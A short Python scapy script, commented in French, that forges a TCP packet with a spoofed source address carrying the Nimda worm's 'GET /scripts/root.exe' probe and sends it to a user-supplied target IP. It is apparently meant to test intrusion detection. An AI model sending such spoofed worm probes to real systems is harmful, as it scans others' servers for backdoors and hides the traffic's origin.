#!/usr/bin/env python3
from scapy.all import Ether, IP, TCP, Raw, send

def send_nimda_packet(target_ip, target_port=80, source_ip="203.0.113.5", source_port=12345):
    """
    Forge et envoie un paquet TCP contenant la signature du ver Nimda.
    """
    packet = (
        IP(src=source_ip, dst=target_ip)
        / TCP(sport=source_port, dport=target_port)
        / Raw(load="GET /scripts/root.exe HTTP/1.0\r\nHost: example.com\r\n\r\n")
    )
    # Envoi standard sur l'interface réseau par défaut
    send(packet, verbose=False) 

if __name__ == "__main__":
    # ATTENTION : Remplacez cette valeur par l'adresse IP de votre cible
    cible_ip = "192.168.X.X"  
    
    if "X" in cible_ip:
        print("[!] Veuillez modifier le script pour indiquer une adresse IP cible valide.")
    else:
        print(f"[*] Simulation d'attaque en cours vers {cible_ip}...")
        send_nimda_packet(cible_ip)
        print("[+] Paquet malveillant envoyé avec succès.")